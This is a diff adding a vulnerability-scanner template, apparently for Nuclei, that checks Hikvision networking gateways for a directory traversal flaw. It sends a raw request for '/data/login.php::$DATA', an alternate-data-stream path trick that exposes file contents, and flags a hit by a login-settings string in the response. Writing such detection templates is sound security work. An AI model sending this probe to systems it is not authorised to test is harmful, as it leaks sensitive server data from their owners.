@@ -1,0 +1,26 @@
+id: hikvision-networking-gateway-directory-traversal
+
+info:
+  name: Hikvision Networking Gateway Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Hikvision networking gateway has a directory traversal vulnerability that allows reading sensitive information.
+  reference:
+    - https://forum.butian.net/share/305
+  tags: directory-traversal, sensitive-info
+
+http:
+  - raw:
+      - |
+        GET /data/login.php::$DATA HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "系统登录设置"
+        part: body
